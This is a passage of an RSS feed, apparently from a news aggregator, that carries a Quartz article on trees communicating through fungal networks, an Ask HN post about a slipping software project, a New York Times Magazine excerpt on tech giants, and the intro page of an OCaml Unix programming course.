<link>https://qz.com/1116991/a-biologist-believes-that-trees-speak-a-language-we-can-learn/</link>
<guid isPermaLink="true" >https://qz.com/1116991/a-biologist-believes-that-trees-speak-a-language-we-can-learn/</guid>
<description>&lt;div&gt;
&lt;p&gt;I’m in a redwood forest in Santa Cruz, California, taking dictation for the trees outside my cabin. They speak constantly, even if quietly, communicating above- and underground using sound, scents, signals, and vibes. They’re &lt;a href=&quot;https://qz.com/959888/a-new-scientific-study-find-that-plant-roots-follow-acoustic-vibes-to-find-a-drink/&quot;&gt;naturally networking,&lt;/a&gt; connected with everything that exists, including you.&lt;/p&gt;
&lt;p&gt;Biologists, ecologists, foresters, and naturalists increasingly argue that trees speak, and that humans can learn to hear this language.&lt;/p&gt;
&lt;p&gt;Many people struggle with this concept because they can’t perceive that trees are interconnected, argues biologist George David Haskell in his 2017 book &lt;a href=&quot;https://www.penguinrandomhouse.com/books/317034/the-songs-of-trees-by-david-george-haskell/9780525427520/&quot;&gt;&lt;em&gt;The Songs of Trees&lt;/em&gt;&lt;/a&gt;. Connection in a network, Haskell says, necessitates communication and breeds languages; understanding that nature is a network is the first step in hearing trees talk.&lt;/p&gt;

&lt;p&gt;For the average global citizen, living far from the forest, that probably seems abstract to the point of absurdity. Haskell points readers to the Amazon rainforest in Ecuador for practical guidance. To the Waorani people living there, nature’s networked character and the idea of communication among all living things seems obvious. In fact, the relationships between trees and other lifeforms are reflected in Waorani language.&lt;/p&gt;
&lt;p&gt;In Waorani, things are described not only by their general type, but also by the other beings surrounding them. So, for example, any one ceibo tree isn’t a “ceibo tree” but is “the ivy-wrapped ceibo,” and another is “the mossy ceibo with black mushrooms.” In fact, anthropologists trying to classify and translate Waorani words into English struggle because, Haskell writes, “when pressed by interviewers, Waorani ‘could not bring themselves’ to give individual names for what Westerners call ‘tree species’ without describing ecological context such as the composition of the surrounding vegetation.”&lt;/p&gt;
&lt;p&gt;Because they relate to the trees as live beings with intimate ties to surrounding people and other creatures, the Waorani aren’t alarmed by the notion that a tree might scream when cut, or surprised that harming a tree should cause trouble for humans. The lesson city-dwellers should take from the Waorani, Haskell says, is that “dogmas of separation fragment the community of life; they wall humans in a lonely room. We must ask the question: ‘can we find an ethic of full earthly belonging?’”&lt;/p&gt;
&lt;img src=&quot;https://cms.qz.com/wp-content/uploads/2017/10/img_0400.jpg?quality=80&amp;amp;strip=all&amp;amp;w=50&quot; class=&quot;progressive-image-thumbnail&quot;/&gt;&lt;img data-srcset=&quot;https://cms.qz.com/wp-content/uploads/2017/10/img_0400.jpg?quality=80&amp;amp;strip=all&amp;amp;w=320 320w, https://cms.qz.com/wp-content/uploads/2017/10/img_0400.jpg?quality=80&amp;amp;strip=all&amp;amp;w=640 640w, https://cms.qz.com/wp-content/uploads/2017/10/img_0400.jpg?quality=80&amp;amp;strip=all&amp;amp;w=940 940w, https://cms.qz.com/wp-content/uploads/2017/10/img_0400.jpg?quality=80&amp;amp;strip=all&amp;amp;w=1600 1600w, https://cms.qz.com/wp-content/uploads/2017/10/img_0400.jpg?quality=80&amp;amp;strip=all&amp;amp;w=3200 3200w&quot; data-src=&quot;https://cms.qz.com/wp-content/uploads/2017/10/img_0400.jpg?quality=80&amp;amp;strip=all&amp;amp;w=2448&quot; sizes=&quot;320px&quot; class=&quot;progressive-image-large&quot; alt=&quot;Redwood, Lompico, CA.&quot;/&gt;There’s room at the Redwood Inn. &lt;span class=&quot;inline-image-credit has-space&quot;&gt;(el)&lt;/span&gt;
&lt;p&gt;Haskell points out that throughout literary and musical history there are references to the songs of trees, and the way they speak: whispering pines, falling branches, crackling leaves, the steady hum buzzing through the forest. Human artists have always known on a fundamental level that trees talk, even if they don’t quite say they have a “language.”&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Redefining communication&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Tree language is a totally obvious concept to ecologist Suzanne Simard, who has spent 30 years studying forests. In June 2016, she gave a Ted Talk (which now has nearly 2.5 million views), called “&lt;a href=&quot;https://www.ted.com/talks/suzanne_simard_how_trees_talk_to_each_other/transcript&quot;&gt;How Trees Talk to Each Other&lt;/a&gt;.”&lt;/p&gt;

&lt;p&gt;Simard grew up in the forests of British Columbia in Canada, studied forestry, and worked in the logging industry. She felt conflicted about cutting down trees, and decided to return to school to study the science of tree communication. Now, &lt;a href=&quot;https://www.ted.com/speakers/suzanne_simard&quot;&gt;Simard teaches ecology&lt;/a&gt; at the University of British Columbia-Vancouver and researches “below-ground fungal networks that connect trees and facilitate underground inter-tree communication and interaction,” she says. As she explained to her Ted Talk audience:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I want to change the way you think about forests. You see, underground there is this other world, a world of infinite biological pathways that connect trees and allow them to communicate and allow the forest to behave as though it’s a single organism. It might remind you of a sort of intelligence.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Trees exchange chemicals with fungus, and send seeds—essentially information packets—with wind, birds, bats, and other visitors for delivery around the world. Simard specializes in the underground relationships of trees. Her research shows that below the earth are vast networks of roots working with fungi to move water, carbon, and nutrients among trees of all species. These complex, symbiotic networks mimic human neural and social networks. They even have mother trees at various centers, managing information flow, and the interconnectedness helps a slew of live things fight disease and survive together.&lt;/p&gt;
&lt;p&gt;Simard argues that this exchange is communication, albeit in a language alien to us. And there’s a lesson to be learned from how forests relate, she says. There’s a lot of cooperation, rather than just competition among and between species as was previously believed.&lt;/p&gt;

&lt;p&gt;Peter Wohlleben came to a similar realization while working his job managing an ancient birch forest in Germany. He told &lt;a href=&quot;https://www.theguardian.com/environment/2016/sep/12/peter-wohlleben-man-who-believes-trees-talk-to-each-other&quot;&gt;the Guardian&lt;/a&gt; he started noticing trees had complex social lives after stumbling upon an old stump still living after about 500 years, with no leaves. “Every living being needs nutrition,” Wohlleben said. “The only explanation was that it was supported by the neighbor trees via the roots with a sugar solution. As a forester, I learned that trees are competitors that struggle against each other, for light, for space, and there I saw that it’s just [the opposite]. Trees are very interested in keeping every member of this community alive.” He believes that they, like humans, have family lives in addition to relationships with other species. The discovery led him to write a book, &lt;a href=&quot;https://www.goodreads.com/book/show/28256439-the-hidden-life-of-trees&quot;&gt;&lt;em&gt;The Hidden Life of Trees&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;By being aware of all living things’ inter-reliance, Simard argues, humans can be wiser about maintaining mother trees who pass on wisdom from one tree generation to the next. She believes it could lead to a more sustainable commercial-wood industry: in a forest, a mother tree is connected to hundreds of other trees, sending excess carbon through delicate networks to seeds below ground, ensuring much greater seedling survival rates.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Foreign language studies&lt;/strong&gt;&lt;/h2&gt;
&lt;img src=&quot;https://cms.qz.com/wp-content/uploads/2017/10/img_2810.jpg?quality=80&amp;amp;strip=all&amp;amp;w=50&quot; class=&quot;progressive-image-thumbnail&quot;/&gt;&lt;img data-srcset=&quot;https://cms.qz.com/wp-content/uploads/2017/10/img_2810.jpg?quality=80&amp;amp;strip=all&amp;amp;w=320 320w, https://cms.qz.com/wp-content/uploads/2017/10/img_2810.jpg?quality=80&amp;amp;strip=all&amp;amp;w=640 640w, https://cms.qz.com/wp-content/uploads/2017/10/img_2810.jpg?quality=80&amp;amp;strip=all&amp;amp;w=940 940w, https://cms.qz.com/wp-content/uploads/2017/10/img_2810.jpg?quality=80&amp;amp;strip=all&amp;amp;w=1600 1600w, https://cms.qz.com/wp-content/uploads/2017/10/img_2810.jpg?quality=80&amp;amp;strip=all&amp;amp;w=3200 3200w&quot; data-src=&quot;https://cms.qz.com/wp-content/uploads/2017/10/img_2810.jpg?quality=80&amp;amp;strip=all&amp;amp;w=2448&quot; sizes=&quot;(max-width: 320px) 320px, 640px&quot; class=&quot;progressive-image-large&quot; alt=&quot;Biology's philosophers in dialogues.&quot;/&gt;Biology’s philosophers in dialogue. &lt;span class=&quot;inline-image-credit has-space&quot;&gt;(el)&lt;/span&gt;
&lt;p&gt;Seedling survival is important to human beings because we need trees. “The contributions of forests to the well-being of humankind are extraordinarily vast and far-reaching,” according to the United Nations Food and Agriculture Organization &lt;a href=&quot;http://www.fao.org/3/a-i4793e.pdf&quot;&gt;2016 report on world forests&lt;/a&gt; (pdf).&lt;/p&gt;
&lt;p&gt;Forests are key to combating rural poverty, ensuring food security, providing livelihoods, supplying clean air and water, maintaining biodiversity, and mitigating climate change, the FAO says. The agency reports that progress is being made toward better worldwide forest conservation but more must be done, given the importance of forests to human survival.&lt;/p&gt;
&lt;p&gt;Most scientists—and trees—would no doubt agree that conservation is key. Haskell believes that ecologically friendly policies would naturally become a priority for people if we’d recognize that trees are masters of connection and communication, managing complex networks that include us. He calls trees “biology’s philosophers,” dialoguing over the ages, and offering up a quiet wisdom. We should listen, the biologist says, because they know what they’re talking about. Haskell writes, “Because they are not mobile, to thrive they must know their particular locus on the Earth far better than any wandering animal.”&lt;/p&gt;

&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;Read next:&lt;/strong&gt; &lt;a href=&quot;https://qz.com/957711/everything-including-the-growing-income-disparity-can-be-explained-by-physics/&quot;&gt;&lt;strong&gt;Everything, including the growing income disparity, can be explained by physics&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;article-aside&quot;&gt;
&lt;aside class=&quot;popular-stories-module&quot;&gt;&lt;article&gt;&lt;h4 class=&quot;module-title&quot;&gt;Most Popular&lt;/h4&gt;
&lt;a href=&quot;https://qz.com/1323940/alexa-is-a-terrible-doctor/&quot; title=&quot;Alexa is a terrible doctor&quot;&gt;&lt;img src=&quot;https://cms.qz.com/wp-content/uploads/2018/07/alexa-health-first-export.png?w=240&quot; alt=&quot;Amazon Alexa's health skills&quot;/&gt;&lt;/a&gt;
&lt;h3&gt;&lt;a href=&quot;https://qz.com/1323940/alexa-is-a-terrible-doctor/&quot; title=&quot;Alexa is a terrible doctor&quot;&gt;Alexa is a terrible doctor&lt;/a&gt;&lt;/h3&gt;
&lt;/article&gt;&lt;/aside&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;button class=&quot;read-full-story-button&quot;&gt;Read full story&lt;/button&gt;</description>
<pubDate>Thu, 12 Jul 2018 04:34:00 +0000</pubDate>
<dc:creator>evo_9</dc:creator>
<og:title>A biologist believes that trees speak a language we can learn</og:title>
<og:type>article</og:type>
<og:image>https://cms.qz.com/wp-content/uploads/2017/10/img_2811.jpg?quality=80&amp;strip=all&amp;w=1600</og:image>
<og:url>https://qz.com/1116991/a-biologist-believes-that-trees-speak-a-language-we-can-learn/</og:url>
<og:description>Humans have long recognized the song of trees.</og:description>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://qz.com/1116991/a-biologist-believes-that-trees-speak-a-language-we-can-learn/</dc:identifier>
</item>
<item>
<title>Ask HN: As a team lead how to handle project going off the rails?</title>
<link>https://news.ycombinator.com/item?id=17511850</link>
<guid isPermaLink="true" >https://news.ycombinator.com/item?id=17511850</guid>
<description>&lt;tr readability=&quot;0.55737704918033&quot;&gt;&lt;td bgcolor=&quot;#FF6600&quot;&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td/&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5.9962917181706&quot;&gt;&lt;td&gt;
&lt;table class=&quot;fatitem&quot; border=&quot;0&quot; readability=&quot;4.7113720642769&quot;&gt;&lt;tr class=&quot;athing&quot; id=&quot;17511850&quot; readability=&quot;0&quot;&gt;&lt;td align=&quot;right&quot; valign=&quot;top&quot; class=&quot;title&quot;/&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;title&quot;&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=17511850&quot; class=&quot;storylink&quot;&gt;Ask HN: As a team lead how to handle project going off the rails?&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;0.74074074074074&quot;&gt;&lt;td colspan=&quot;2&quot;/&gt;
&lt;td class=&quot;subtext&quot;&gt;&lt;span class=&quot;score&quot; id=&quot;score_17511850&quot;&gt;283 points&lt;/span&gt; by &lt;a href=&quot;https://news.ycombinator.com/user?id=le-mark&quot; class=&quot;hnuser&quot;&gt;le-mark&lt;/a&gt; &lt;span class=&quot;age&quot;&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=17511850&quot;&gt;21 hours ago&lt;/a&gt;&lt;/span&gt; &lt;span id=&quot;unv_17511850&quot;/&gt; | &lt;a href=&quot;https://news.ycombinator.com/hide?id=17511850&amp;amp;goto=item%3Fid%3D17511850&quot;&gt;hide&lt;/a&gt; | &lt;a href=&quot;https://hn.algolia.com/?query=Ask%20HN%3A%20As%20a%20team%20lead%20how%20to%20handle%20project%20going%20off%20the%20rails%3F&amp;amp;sort=byDate&amp;amp;dateRange=all&amp;amp;type=story&amp;amp;storyText=false&amp;amp;prefix&amp;amp;page=0&quot; class=&quot;hnpast&quot;&gt;past&lt;/a&gt; | &lt;a href=&quot;https://www.google.com/search?q=Ask%20HN%3A%20As%20a%20team%20lead%20how%20to%20handle%20project%20going%20off%20the%20rails%3F&quot;&gt;web&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/fave?id=17511850&amp;amp;auth=3b156e65971e28e645997ce59f1d83ce649b7b8b&quot;&gt;favorite&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/item?id=17511850&quot;&gt;177 comments&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td/&gt;
&lt;/tr&gt;&lt;tr readability=&quot;10&quot;&gt;&lt;td colspan=&quot;2&quot;/&gt;
&lt;td readability=&quot;9&quot;&gt;This is kind of a banal story. I'm the lead developer on a &quot;modernization&quot; project that's taking a lot longer than anticipated (you see where this is going). The team is great, it's just that the work is way outside their comfort zone. The business has been selling the new version pretty hard and we're not going to make the release (about 3 months to go).
&lt;p&gt;Question is; as a lead how would you handle this? I think my direct manager has a healthy dose of skepticism about the timeline, but the product owner doesn't. At what point should I start sounding the alarm? I'd like to give it a couple of weeks and see if the team picks up pace but I'm not confident.&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td/&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot;/&gt;
&lt;td&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;1&quot;&gt;&lt;td&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;10&quot; width=&quot;0&quot;/&gt;&lt;br/&gt;&lt;center&gt;&lt;span class=&quot;yclinks&quot;&gt;&lt;a href=&quot;https://news.ycombinator.com/newsguidelines.html&quot;&gt;Guidelines&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/newsfaq.html&quot;&gt;FAQ&lt;/a&gt; | &lt;a href=&quot;mailto:hn@ycombinator.com&quot;&gt;Support&lt;/a&gt; | &lt;a href=&quot;https://github.com/HackerNews/API&quot;&gt;API&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/security.html&quot;&gt;Security&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/lists&quot;&gt;Lists&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/bookmarklet.html&quot; rel=&quot;nofollow&quot;&gt;Bookmarklet&lt;/a&gt; | &lt;a href=&quot;http://www.ycombinator.com/legal/&quot;&gt;Legal&lt;/a&gt; | &lt;a href=&quot;http://www.ycombinator.com/apply/&quot;&gt;Apply to YC&lt;/a&gt; | &lt;a href=&quot;mailto:hn@ycombinator.com&quot;&gt;Contact&lt;/a&gt;&lt;/span&gt;
&lt;/center&gt;
&lt;/td&gt;
&lt;/tr&gt;</description>
<pubDate>Thu, 12 Jul 2018 02:56:49 +0000</pubDate>
<dc:creator>le-mark</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://news.ycombinator.com/item?id=17511850</dc:identifier>
</item>
<item>
<title>Have the Tech Giants Grown Too Powerful?</title>
<link>https://www.nytimes.com/2018/07/11/magazine/facebook-google-uber-tech-giants-power.html</link>
<guid isPermaLink="true" >https://www.nytimes.com/2018/07/11/magazine/facebook-google-uber-tech-giants-power.html</guid>
<description>&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;Other questions are more technical. An easy question with a hard answer: Who owns the content I upload to Instagram? (You do — except you have granted Instagram &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://help.instagram.com/478745558852511&quot; title=&quot;&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;a license to use it&lt;/a&gt; for almost any purpose.) Is Instagram listening to me? Because these ads are kind of creeping me out. (No, but the company partners with other firms that collect information about your online behavior, so if for instance you talked about something, then searched for it on your phone in a different app, maybe it could end up helping Instagram serve an ad, so, well, yes, &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.cbsnews.com/news/phone-listening-facebook-google-ads/&quot; title=&quot;&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;but not literally&lt;/a&gt;, no, it is not listening to your spoken words.) O.K., then, what about my Echo — is my Amazon Echo always listening to me? (No — well, &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.amazon.com/gp/help/customer/display.html?nodeId=201602230&quot; title=&quot;&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;only so it can hear&lt;/a&gt; when you say “Alexa.” So, yes?) So is my Echo listening when, for example, I’m having sex? (Again, no, only for the word “Alexa,” so, well, actually yes.)&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;&lt;strong class=&quot;css-8qgvsz euv7paa0&quot;&gt;The companies most&lt;/strong&gt; vulnerable to easy questions tend to be the ones that can no longer be understood in terms of former competitors or current peers — because they don’t really have any. Google doesn’t have to worry about losing its users; it simply wants them to use Google more and to use more Google products. Vindicated by growth, these businesses take the liberty to redesign more of our online lives than any of us have asked for. As with Facebook, and to some extent now Amazon, there is no overarching pitch to its users beyond: Where else could you possibly go?&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;With impressive speed, companies founded to confront “intolerable” problems that it “must be possible to solve” have become intolerable in ways obvious to everyone but them. When Mark Zuckerberg was summoned in front of American and European lawmakers, the hardest questions to answer were some of the easiest to ask: Would Mr. Zuckerberg, whose company trades in such information, be comfortable sharing with the world the name of the hotel he stayed at last night, or the people he messaged with this week? (No, &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.youtube.com/watch?v=sWDwh5UxWMs&quot; title=&quot;&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;of course not&lt;/a&gt;.) How does Facebook make money? (An unilluminating “We run ads.”) Does Facebook have any competitors, really? (Sure, like ... email?)&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;There are companies that are mostly immune to the easy-question-hard-answer dynamic. Easy questions about Netflix, for one, tend to have easy answers: You pay; they stream. Most obvious questions about Apple can be answered by pointing out that it would like to sell you expensive items on a fairly regular basis. What these more straightforward companies have in common is that their founding questions doubled as consumer rallying cries — they asked, and continued to ask, about things that their customers need, or at least want, and tend to understand.&lt;/p&gt;
&lt;p class=&quot;css-1i0edl6 e2kc3sl0&quot;&gt;But for the rest of the tech giants, the easy questions have much harder answers. As these companies grew, they did more than just vanquish their competition. Their growth and free-service benevolence succeeded at making the very idea of competitors’ challenging their efforts — the industry’s traditional way to solve the problems they’ve created — seem unnecessary or even counterproductive. They’ve ducked the easy questions for so long that it’s reasonable to suspect that they doubt we will like the answers.&lt;/p&gt;
</description>
<pubDate>Thu, 12 Jul 2018 01:37:04 +0000</pubDate>
<dc:creator>clumsysmurf</dc:creator>
<og:url>https://www.nytimes.com/2018/07/11/magazine/facebook-google-uber-tech-giants-power.html</og:url>
<og:type>article</og:type>
<og:title>Have the Tech Giants Grown Too Powerful? That’s an Easy One</og:title>
<og:image>https://static01.nyt.com/images/2018/07/15/magazine/15mag-ontech-image1/15mag-ontech-image1-facebookJumbo-v3.png</og:image>
<og:description>Tech companies have changed the world by building answers to obvious questions — but now the obvious, pressing questions are about them.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.nytimes.com/2018/07/11/magazine/facebook-google-uber-tech-giants-power.html</dc:identifier>
</item>
<item>
<title>Unix system programming in OCaml (2014)</title>
<link>https://ocaml.github.io/ocamlunix/index.html</link>
<guid isPermaLink="true" >https://ocaml.github.io/ocamlunix/index.html</guid>
<description>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;meta name=&quot;generator&quot; content=&quot;hevea 2.01&quot; /&gt;&lt;title&gt;Unix system programming in OCaml&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;ocamlunix.css&quot; /&gt;&lt;/head&gt;&lt;body id=&quot;readabilityBody&quot; readability=&quot;46.045454545455&quot;&gt;
&lt;table class=&quot;title&quot; readability=&quot;1.5&quot;&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;

&lt;h3 class=&quot;titlerest&quot;&gt;Xavier Leroy and Didier Rémy&lt;/h3&gt;
&lt;h3 class=&quot;titlerest&quot;&gt;1&lt;sup&gt;st&lt;/sup&gt;December , 2014&lt;/h3&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;div class=&quot;copyrightnotice&quot; readability=&quot;41.358778625954&quot;&gt;© 1991, 1992, 2003, 2004, 2005, 2006, 2008, 2009, 2010&lt;br /&gt;Xavier Leroy and Didier Rémy, &lt;span class=&quot;c005&quot;&gt;inria&lt;/span&gt; Rocquencourt.&lt;br /&gt;Rights reserved. Consult the &lt;a href=&quot;https://ocaml.github.io/ocamlunix/LICENSE&quot;&gt;license.&lt;/a&gt; &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-sa/2.0/fr/&quot;&gt;&lt;img class=&quot;ccimage&quot; src=&quot;http://i.creativecommons.org/l/by-nc-sa/2.0/fr/80x15.png&quot; alt=&quot;CreativeCommons License&quot; /&gt;&lt;/a&gt;
&lt;p&gt;&lt;em&gt;Translation by&lt;/em&gt; Daniel C. Bünzli, Eric Cooper, Eliot Handelman, Priya Hattiangdi, Thad Meyer, Prashanth Mundkur, Richard Paradies, Till Varoquaux, Mark Wong-VanHaren&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Proofread by&lt;/em&gt; David Allsopp, Erik de Castro Lopo, John Clements, Anil Madhavapeddy, Prashanth Mundkur&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Translation coordination &amp;amp; layout by&lt;/em&gt; Daniel C. Bünzli.&lt;/p&gt;
&lt;p&gt;Please send corrections to &lt;span class=&quot;c001&quot;&gt;daniel.buenzl i@erratique.ch&lt;/span&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Available as a &lt;a href=&quot;https://ocaml.github.io/ocamlunix/ocamlunix.html&quot;&gt;monolithic file&lt;/a&gt;, &lt;a href=&quot;https://ocaml.github.io/ocamlunix/index.html&quot;&gt;by chapters&lt;/a&gt;, and in &lt;a href=&quot;https://ocaml.github.io/ocamlunix/ocamlunix.pdf&quot;&gt;PDF&lt;/a&gt; — git &lt;a href=&quot;http://github.com/ocaml/ocamlunix/&quot;&gt;repository&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This document is an introductory course on Unix system programming, with an emphasis on communications between processes. The main novelty of this work is the use of the OCaml language, a dialect of the ML language, instead of the C language that is customary in systems programming. This gives an unusual perspective on systems programming and on the ML language.&lt;/p&gt;
&lt;/body&gt;</description>
<pubDate>Wed, 11 Jul 2018 23:00:14 +0000</pubDate>
<dc:creator>jxub</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://ocaml.github.io/ocamlunix/index.html</dc:identifier>
</item>
</channel>
</rss>